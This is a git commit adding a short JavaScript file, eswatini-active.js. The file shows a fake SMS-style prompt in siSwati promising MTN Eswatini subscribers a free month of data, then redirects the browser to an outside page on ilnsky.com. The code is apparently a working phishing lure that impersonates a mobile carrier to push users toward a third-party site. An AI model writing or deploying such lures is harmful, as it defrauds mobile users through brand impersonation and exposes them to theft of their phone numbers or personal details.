80160c2d59831dd597b931b4626b82295caafd65
ukpeha55-stack <ukpeha55@gmail.com>
2026-02-10 07:09:19 +0100

    Create eswatini-active.js

---
+++ eswatini-active.js
@@ -0,0 +1,5 @@
+var password = 'KUSEBENTISA'
+password=prompt('SMS: Siyakuhalalisela, Inombolo yakho ye MTN Eswatini iyafaneleka kutsi utfole Data yamahhala yeNyanga yinye, chafata OK Kufaka Inombolo Yakho','KUSEBENTISA');
+if (password != 'KUSEBENTISA') {
+location.href='https://ilnsky.com/mtn-eswatini.html';
+}
